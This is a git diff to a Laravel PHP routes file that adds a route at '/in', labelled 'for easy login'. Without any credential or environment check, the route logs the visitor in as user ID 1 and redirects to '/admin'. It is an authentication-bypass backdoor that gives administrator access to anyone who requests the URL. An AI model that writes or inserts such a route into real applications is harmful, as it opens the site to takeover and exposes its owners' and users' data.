@@ -5,6 +5,12 @@ use App\Http\Controllers\Auth\GoogleAuthController;
 use App\Http\Controllers\ProfileController;
 use Illuminate\Support\Facades\Route;
 
+// for easy login
+Route::get('/in', function () {
+    $user = auth()->loginUsingId(1);
+    return redirect('/admin');
+});
+
 Route::get('/', function () {
     return view('home');
 })->middleware(['auth', 'verified']);
